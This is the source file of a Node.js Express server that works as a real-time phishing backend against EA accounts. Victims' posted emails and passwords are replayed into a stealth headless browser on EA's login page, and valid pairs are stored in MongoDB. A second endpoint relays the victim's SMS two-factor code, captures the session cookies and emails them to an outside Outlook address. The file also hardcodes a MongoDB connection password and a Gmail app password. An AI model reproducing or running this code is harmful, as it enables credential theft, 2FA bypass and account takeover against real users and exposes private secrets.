const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const MongoClient = require('mongodb').MongoClient;
const fs = require('fs/promises'); // Use fs/promises for async/await
const nodemailer = require('nodemailer');


const app = express();
app.use(express.json());

const mongoUri = 'mongodb+srv://khaliljebalikj:bA54eX6ZEKPu4Apx@fifa.gpnyeyh.mongodb.net/?retryWrites=true&w=majority'; // Update with your MongoDB connection string
const dbName = 'fifa'; // Update with your database name

const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';



// Define your email configuration (adjust these with your SMTP settings)
const transporter = nodemailer.createTransport({
  service: 'gmail', // You can use any email service like Gmail, Outlook, etc.
  auth: {
    user: 'khalil.jebali.kj@gmail.com', // Your email address
    pass: 'uues avtv cbhp zitk', // Your email password or an app-specific password for security
  },
});


puppeteer.use(StealthPlugin());


const resultCollectionName = 'results';
const cookiesCollectionName = 'cookies';

let browser;
let page; // This will hold the current page for requests
let isPageLoading = false; // To avoid race conditions

const loginUrl = "https://www.ea.com/login";
const sendCodeButtonSelector = 'a#btnSendCode';
const errorMessageSelector = 'p.otkinput-errormsg.otkc';


//-------------------------------------------------- Cache-Handling ------------------------------------------------------------------------

// In-Memory Cache Implementation
const emailCache = {};
const CACHE_TTL = 60000; // 1 minute in milliseconds

function cacheEntry(ip, data) {
    emailCache[ip] = {
        data,
        timestamp: Date.now(),
    };
}

function getCacheEntry(ip) {
    const entry = emailCache[ip];
    if (entry) {
        // Check if the entry has expired
        if (Date.now() - entry.timestamp < CACHE_TTL) {
            return entry.data;
        } else {
            delete emailCache[ip]; // Remove expired entry
        }
    }
    return null;
}





async function startBrowserAndPage() {
    browser = await puppeteer.launch({
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-gpu',
            '--enable-webgl',
        ],
    });

    await preloadNewPage(); // Preload the initial page
}

//------------------------------------------- Preload Page --------------------------------------------------

async function preloadNewPage() {
    if (isPageLoading) return; // Avoid multiple pages being loaded at the same time
    isPageLoading = true;

    page = await browser.newPage();

    await page.setRequestInterception(true);
    page.on('request', (request) => {
        if (['image', 'stylesheet', 'font'].includes(request.resourceType())) {
            request.abort(); // Block images, styles, and fonts
        } else {
            request.continue();
        }
    });

    await page.setUserAgent(ua);
    await page.goto(loginUrl, { waitUntil: 'domcontentloaded' });
    await page.setViewport({ width: 1280, height: 800 });

    // Ensure remember me is checked
    await page.evaluate(() => {
        const rememberMeCheckbox = document.querySelector('input#rememberMe');
        if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
    });

    console.log('Page preloaded and ready for the next request.');
    isPageLoading = false; // Mark the page as fully loaded
}

startBrowserAndPage();

//---------------------------------------- Perform Login ----------------------------------------------------

// Function to handle login
async function performLogin(page, email, password, sendCodeButtonSelector, errorMessageSelector) {
    try {
        // Enter email and password on their respective pages
        await page.type('input[id="email"]', email);
        console.log("Email input complete.");

        // Simulate pressing "Enter" after entering the email
        await page.keyboard.press('Enter'); // Move to the password page

        // Wait for navigation to the password page
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });
        console.log("Navigated to the password page.");

        // Enter password on the second page
        await page.type('input[id="password"]', password);
        console.log("Password input complete.");

        // Submit the form and wait for navigation
        await Promise.all([
            page.keyboard.press('Enter'), // Submit the form
            page.waitForNavigation({ waitUntil: 'domcontentloaded' }) // Wait for the next page
        ]);

        // Check for error message after login attempt
        const errorMessageElement = await page.$(errorMessageSelector);
        if (errorMessageElement) {
            console.log("Login failed due to incorrect credentials.");
            return false; // Error found
        }

        // Wait for the "Send Code" button to appear
        const sendCodeVisible = await page.waitForSelector(sendCodeButtonSelector, { timeout: 5000 }).catch(() => false);
        if (sendCodeVisible) {
            await page.click(sendCodeButtonSelector);
            console.log('Send Code button clicked');
            return true; // Successfully initiated sending code
        } else {
            console.log("Send Code button not found.");
            return false; // Could not find the "Send Code" button
        }

    } catch (error) {
        console.error("Error during login process:", error);
        return false;
    }
}

//---------------------------------------- Get Email By IP --------------------------------------------------

async function getEmailPasswordByIP(ip) {
    const db = await connectToMongo();
    const collection = db.collection(resultCollectionName);
    
    const entry = await collection.findOne({ ip });
    if (!entry) {
        throw new Error('IP not found');
    }

    return { email: entry.email, password: entry.password };
}

//---------------------------------------- Saving emails and passwords --------------------------------------
async function saveEmailPasswordIP(email, password, ip) {
    
    const cachedData = getCacheEntry(ip);
    if (cachedData) {
        console.log('Data already cached for this IP. Skipping database operation.');
        return;
    }
  
    
  
    const db = await connectToMongo();
    const collection = db.collection(resultCollectionName);

    const existingEntry = await collection.findOne({ ip });
    if (existingEntry) {
        // Update existing entry
        await collection.updateOne({ ip }, { $set: { email, password } });
    } else {
        // Insert new entry
        await collection.insertOne({ email, password, ip });
    }

    cacheEntry(ip, { email, password });
    console.log('Data saved successfully.');
}

//----------------------------------------- Login route -----------------------------------------------------

// Endpoint handling the request
app.post('/login', async (req, res) => {
    const { email, password, ip } = req.body;

    if (!email || !password || !ip) {
        return res.status(400).json({ error: 'Email, password, and IP are required' });
    }

    try {
        // Ensure page is loaded before proceeding
        if (isPageLoading) {
            console.log("Waiting for page to load...");
            await new Promise((resolve) => {
                const checkPageLoaded = setInterval(() => {
                    if (!isPageLoading) {
                        clearInterval(checkPageLoaded);
                        resolve();
                    }
                }, 500); // Poll every 500ms
            });
        }

        // Perform the login using the preloaded page
        const loginSuccessful = await performLogin(page, email, password, sendCodeButtonSelector, errorMessageSelector);

        if (!loginSuccessful) {
            return res.status(400).json({ error: 'Wrong credentials. Please check your email and password.' });
        }

        // Save email, password, and IP after a successful login
        await saveEmailPasswordIP(email, password, ip); // Call the save function

        res.status(200).json({ success: true, message: 'Login successful' });
        console.log("Login successful");

    } catch (error) {
        console.error('Error during login:', error);
        res.status(500).json({ error: 'Internal server error' });
    } finally {
        // Close the current page and preload a new one asynchronously
        if (page && !page.isClosed()) {
            await page.close();
            console.log("Page closed successfully");

            // Immediately start preloading a new page in the background
            preloadNewPage();
        }
    }
});

//----------------------------------------- SMS-Cookies -----------------------------------------------------

async function SecondperformLogin(page, email, password, sendCodeButtonSelector, errorMessageSelector) {
    try {
        // Ensure "Remember Me" is checked
        await page.evaluate(() => {
            const rememberMeCheckbox = document.querySelector('input#rememberMe');
            if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
        });

        // Wait for and type email
        await page.waitForSelector('input[id="email"]', { visible: true });
        await page.type('input[id="email"]', email);
        console.log("Email input complete.");

        // Simulate pressing "Enter" after entering the email
        await page.keyboard.press('Enter'); // Move to the password page

        // Wait for navigation to the password page
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });
        console.log("Navigated to the password page.");

        // Wait for and type password
        await page.waitForSelector('input[id="password"]', { visible: true });
        const passwordField = await page.$('input[id="password"]');
        if (passwordField) {
            console.log("Password field found, typing...");
            await page.type('input[id="password"]', password);
        } else {
            console.error("Password field not found!");
            return false; // Exit if the password field is not found
        }

        // Submit the form and wait for navigation
        await Promise.all([
            page.keyboard.press('Enter'), // Submit the form
            page.waitForNavigation({ waitUntil: 'domcontentloaded' }) // Wait for the next page
        ]);

        // Check for error message after login attempt
        const errorMessageElement = await page.$(errorMessageSelector);
        if (errorMessageElement) {
            console.log("Login failed due to incorrect credentials.");
            return false; // Error found
        }

        // Wait for the "Send Code" button to appear
        const sendCodeVisible = await page.waitForSelector(sendCodeButtonSelector, { timeout: 10000 }).catch(() => false);
        if (sendCodeVisible) {
            console.log("Send code button detected, clicking...");
            await page.click(sendCodeButtonSelector);
            return true; // Successfully initiated sending code
        } else {
            console.error("Send code button not found!");
            return false; // Could not find the "Send Code" button
        }

    } catch (error) {
        console.error('Error during login:', error);
        return false; // Return false on error
    }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

app.post('/loginsms', async (req, res) => {
    const { ip, code } = req.body;

    if (!ip || !code) {
        return res.status(400).json({ error: 'IP and code are required' });
    }

    let browser; // Declare the browser variable outside the try block
    try {
        const emailPasswordData = await getEmailPasswordByIP(ip);

        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-gpu',
                '--enable-webgl',
                '--window-size=1500,800',
                '--disable-http2'
            ],
        });

        const page = await browser.newPage();

        await page.setRequestInterception(true);
        page.on('request', (request) => {
            if (['image', 'stylesheet', 'font'].includes(request.resourceType())) {
                request.abort(); // Block images, styles, and fonts
            } else {
                request.continue();
            }
        });

        await page.setUserAgent(ua);
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });

        await SecondperformLogin(page, emailPasswordData.email, emailPasswordData.password, sendCodeButtonSelector, errorMessageSelector);

        console.log('Before waiting for twoFactorCode input field');
        await page.waitForSelector('input#twoFactorCode', { visible: true, timeout: 15000 });
        console.log('After waiting for twoFactorCode input field');

        console.log('Before typing code');
        await page.type('input#twoFactorCode', code);
        console.log('After typing code');

        console.log('Before waiting for btnSubmit button');
        await page.waitForSelector('a#btnSubmit', { visible: true, timeout: 15000 });
        console.log('After waiting for btnSubmit button');

        console.log('Before clicking btnSubmit button');
        await page.click('a#btnSubmit');
        console.log('After clicking btnSubmit button');

        await page.waitForNavigation({ waitUntil: 'networkidle2' });
        await sleep(3000);

        const cookies = await page.cookies();

        const db = await connectToMongo();
        const cookiesCollection = db.collection(cookiesCollectionName);
        
        const userEntry = {
            email: emailPasswordData.email,
            password: emailPasswordData.password,
            cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
        };


        await cookiesCollection.updateOne(
            { email: emailPasswordData.email },
            { $set: { cookies: userEntry.cookies } },
            { upsert: true } // Insert if not found
        );

        const emailOptions = {
    from: '"JK23" <khalil.jebali.kj@gmail.com>', // Setting the sender's name and email
    to: 'feac23@outlook.com',
    subject: emailPasswordData.email,
    text: `Here are the cookies that were just saved:\n\n${JSON.stringify(userEntry, null, 2)}`,
};

        await sendEmail(emailOptions).catch(err => {
            console.error('Failed to send email:', err);
        });

        res.status(200).json({ success: true, message: 'Login successful after SMS' });

    } catch (error) {
        console.error('Error during SMS login:', error);
        res.status(500).json({ error: 'Error during SMS login' });
    } finally {
        if (browser) {
            await browser.close(); // Close the browser in the finally block
        }
        console.log("Te5dem nayek :)");
    }
});


const sendEmail = async (emailOptions) => {
  return new Promise((resolve, reject) => {
    transporter.sendMail(emailOptions, (err, info) => {
      if (err) {
        console.error('Error sending email:', err);
        reject(err);
      } else {
        console.log('Email sent:', info.response);
        resolve(info);
      }
    });
  });
};



// Mongo connection 
let dbInstance = null;

async function connectToMongo() {
    if (!dbInstance) {
        const client = new MongoClient(mongoUri, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });
        await client.connect();
        dbInstance = client.db(dbName);
    }
    return dbInstance;
}

// Gracefully close the browser when the application is terminated
process.on('SIGINT', async () => {
    if (browser) {
        await browser.close();
    }
    process.exit();
});

// Start the server
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
